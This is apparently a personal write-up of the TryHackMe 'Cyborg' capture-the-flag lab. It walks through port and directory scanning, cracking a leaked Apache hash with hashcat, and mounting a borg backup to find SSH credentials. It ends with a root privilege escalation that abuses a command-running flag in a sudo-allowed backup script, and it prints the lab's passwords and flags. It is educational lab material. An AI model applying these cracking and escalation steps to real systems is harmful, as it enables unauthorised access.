---
title: "Cyborg"
date: 2025-01-14
slug: cyborg
tags: [tryhackme, linux, web, privesc]
difficulty: Easy
---
IP = 10.10.81.118

---
**Enumeration** 

```

❯ nmap -sCV 10.10.81.118
Starting Nmap 7.92 ( https://nmap.org ) at 2025-01-14 16:00 IST
Nmap scan report for 10.10.81.118
Host is up (0.14s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 db:b2:70:f3:07:ac:32:00:3f:81:b8:d0:3a:89:f3:65 (RSA)
|   256 68:e6:85:2f:69:65:5b:e7:c6:31:2c:8e:41:67:d7:ba (ECDSA)
|_  256 56:2c:79:92:ca:23:c3:91:49:35:fa:dd:69:7c:ca:ab (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

``
`gobuster dir -u http://10.10.81.118/ -w ~/ctf/wordlist/directory-list-2.3-medium.txt -x php,html,js
found - 
/admin
/etc

in /etc we have 
![[Pasted image 20250114161701.png]]


also 
we found /admin
there is a archive file we can download from the admin and a message 

> [!NOTE]
> Ok sorry guys i think i messed something up, uhh i was playing around with the squid proxy i mentioned earlier.
> I decided to give up like i always do ahahaha sorry about that.
> I heard these proxy things are supposed to make your website secure but i barely know how to use it so im probably making it more insecure in the process.
> Might pass it over to the IT guys but in the meantime all the config files are laying about.
> And since i dont know how it works im not sure how to delete them hope they don't contain any confidential information lol.
> other than that im pretty sure my backup "music_archive" is safe just to confirm.

---


**hash cracking**

in /etc the contents of passwd file:
`music_archive:$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.`

with the use of hash-identifier 
```
hash-identifier                                       
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\ #
   #    \ \ \_\ \ __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \ #
   #     \ \ _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \ \_\ \__ \ \ \_\ \ #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------
 HASH: $apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.

Possible Hashs:
[+] MD5(APR)
```
MD5(APR) type 


cracking the hash 
```

❯ ./hashcat -m 1600 -a 0 -o ~/ctf/crck.txt ~/ctf/relevant/home/field/dev/final_archive/data/0/hash.txt ~/ctf/wordlist/rockyou.txt

hashcat (v6.2.6-851-g6716447df) starting

OpenCL API (OpenCL 3.0 PoCL 6.0  Linux, Release, RELOC, LLVM 18.1.7, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
================================================================================================================================
* Device #1: cpu-haswell-Intel(R) Core(TM) i5-10300H CPU @ 2.50GHz, 6853/13770 MB (2048 MB allocatable), 8MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 2 MB

Dictionary cache built:
* Filename..: /home/dedfish404/ctf/wordlist/rockyou.txt
* Passwords.: 14344391
* Bytes.....: 139921497
* Keyspace..: 14344384
* Runtime...: 2 secs

                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1600 (Apache $apr1$ MD5, md5apr1, MD5 (APR))
Hash.Target......: $apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.
Time.Started.....: Tue Jan 14 21:43:33 2025 (3 secs)
Time.Estimated...: Tue Jan 14 21:43:36 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/home/dedfish404/ctf/wordlist/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:    15762 H/s (5.60ms) @ Accel:64 Loops:250 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 39424/14344384 (0.27%)
Rejected.........: 0/39424 (0.00%)
Restore.Point....: 38912/14344384 (0.27%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:750-1000
Candidate.Engine.: Device Generator
Candidates.#1....: toutou -> cheer4u
Hardware.Mon.#1..: Temp: 59c Util: 95%

Started: Tue Jan 14 21:42:45 2025
Stopped: Tue Jan 14 21:43:37 2025
❯ 
^[[200~cat ~/ctf/crck.txt                                                                                                                                                                                                                    
❯ cat ~/ctf/crck.txt


```

we get:
$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.:squidward


also go a archive.tar file so we will extract it in our system using 

`❯ tar -xf archive.tar`

```
❯ tar --help
Usage: tar [OPTION...] [FILE]...
GNU 'tar' saves many files together into a single tape or disk archive, and can
restore individual files from the archive.

Examples:
  tar -cf archive.tar foo bar  # Create archive.tar from files foo and bar.
  tar -tvf archive.tar         # List all files in archive.tar verbosely.
  tar -xf archive.tar          # Extract all files from archive.tar.
```

the folder has more folders and the `final_archive` dir looks like the one we should focus on
https://borgbackup.readthedocs.io/en/stable/
using borg to decrypt the final archive dir inside the extracted archive archive 
`$borg list final_archive`
borg is used to archive files also applying passwords to it 
the command will list down the archives stored in repo final_archive which are encrypted
also we will mount the final_archive to a mounted directory 
```
$borg list final_archive
Enter passphrase for key /home/dedfish404/ctf/relevant/home/field/dev/final_archive: 
music_archive                        Tue, 2020-12-29 19:30:38 [f789ddb6b0ec108d130d16adebf5713c29faf19c44cad5e1eeb8ba37277b1c82]

❯ mkdir mounted
❯ borg mount final_archive mounted

❯ cd mounted/music_archive/home/alex/Desktop
❯ ls
secret.txt
❯ cat secret.txt
shoutout to all the people who have gotten to this stage whoop whoop!"
❯ ls
secret.txt
❯ cd ..
❯ ls
Desktop  Documents  Downloads  Music  Pictures  Public  Templates  Videos
❯ cd Documents
❯ ls
note.txt
❯ cat note.txt
Wow I'm awful at remembering Passwords so I've taken my Friends advice and noting them down!

alex:S3cretP@s3

```

using this info to login as alex through ssh - 
`alex:S3cretP@s3`



----
**Exploitation**

`❯ ssh alex@10.10.238.195`
cat user.txt to get the flag  - flag{1_hop3_y0u_ke3p_th3_arch1v3s_saf3}

---

**privilege escalation**

```
alex@ubuntu:/$ sudo -l
Matching Defaults entries for alex on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alex may run the following commands on ubuntu:
    (ALL : ALL) NOPASSWD: /etc/mp3backups/backup.sh

```

looks like we can run the backup.sh as root user so lets cat the backups.sh file and see what we can do with it 


```
alex@ubuntu:/etc/mp3backups$ cat backup.sh 
#!/bin/bash

sudo find / -name "*.mp3" | sudo tee /etc/mp3backups/backed_up_files.txt


input="/etc/mp3backups/backed_up_files.txt"
#while IFS= read -r line
#do
  #a="/etc/mp3backups/backed_up_files.txt"
#  b=$(basename $input)
  #echo
#  echo "$line"
#done < "$input"

while getopts c: flag
do
	case "${flag}" in 
		c) command=${OPTARG};;
	esac
done



backup_files="/home/alex/Music/song1.mp3 /home/alex/Music/song2.mp3 /home/alex/Music/song3.mp3 /home/alex/Music/song4.mp3 /home/alex/Music/song5.mp3 /home/alex/Music/song6.mp3 /home/alex/Music/song7.mp3 /home/alex/Music/song8.mp3 /home/alex/Music/song9.mp3 /home/alex/Music/song10.mp3 /home/alex/Music/song11.mp3 /home/alex/Music/song12.mp3"

# Where to backup to.
dest="/etc/mp3backups/"

# Create archive filename.
hostname=$(hostname -s)
archive_file="$hostname-scheduled.tgz"

# Print start status message.
echo "Backing up $backup_files to $dest/$archive_file"

echo

# Backup the files using tar.
tar czf $dest/$archive_file $backup_files

# Print end status message.
echo
echo "Backup finished"

cmd=$($command)
echo $cmd

```

looks like this script makes backup for the music files but this also has a cmd parameter in last and that echo the command in the shell we can pass any command here and it will execute as root user so we can pass `cat /root/root.txt` here and we can obtain the falg 

this is called command injection where the script can be run by a normal user with admin privileges and the script has parameters where the user can enter any commands that can be malicious without check 


```
alex@ubuntu:/etc/mp3backups$ sudo ./backup.sh -c "cat /root/root.txt"
/home/alex/Music/image12.mp3
/home/alex/Music/image7.mp3
/home/alex/Music/image1.mp3
/home/alex/Music/image10.mp3
/home/alex/Music/image5.mp3
/home/alex/Music/image4.mp3
/home/alex/Music/image3.mp3
/home/alex/Music/image6.mp3
/home/alex/Music/image8.mp3
/home/alex/Music/image9.mp3
/home/alex/Music/image11.mp3
/home/alex/Music/image2.mp3
find: ‘/run/user/108/gvfs’: Permission denied
Backing up /home/alex/Music/song1.mp3 /home/alex/Music/song2.mp3 /home/alex/Music/song3.mp3 /home/alex/Music/song4.mp3 /home/alex/Music/song5.mp3 /home/alex/Music/song6.mp3 /home/alex/Music/song7.mp3 /home/alex/Music/song8.mp3 /home/alex/Music/song9.mp3 /home/alex/Music/song10.mp3 /home/alex/Music/song11.mp3 /home/alex/Music/song12.mp3 to /etc/mp3backups//ubuntu-scheduled.tgz

tar: Removing leading `/' from member names
tar: /home/alex/Music/song1.mp3: Cannot stat: No such file or directory
tar: /home/alex/Music/song2.mp3: Cannot stat: No such file or directory
tar: /home/alex/Music/song3.mp3: Cannot stat: No such file or directory
tar: /home/alex/Music/song4.mp3: Cannot stat: No such file or directory
tar: /home/alex/Music/song5.mp3: Cannot stat: No such file or directory
tar: /home/alex/Music/song6.mp3: Cannot stat: No such file or directory
tar: /home/alex/Music/song7.mp3: Cannot stat: No such file or directory
tar: /home/alex/Music/song8.mp3: Cannot stat: No such file or directory
tar: /home/alex/Music/song9.mp3: Cannot stat: No such file or directory
tar: /home/alex/Music/song10.mp3: Cannot stat: No such file or directory
tar: /home/alex/Music/song11.mp3: Cannot stat: No such file or directory
tar: /home/alex/Music/song12.mp3: Cannot stat: No such file or directory
tar: Exiting with failure status due to previous errors

Backup finished
flag{Than5s_f0r_play1ng_H0p£_y0u_enJ053d}
```

---
flags 
user.txt - flag{1_hop3_y0u_ke3p_th3_arch1v3s_saf3}

root.txt - flag{Than5s_f0r_play1ng_H0p£_y0u_enJ053d}
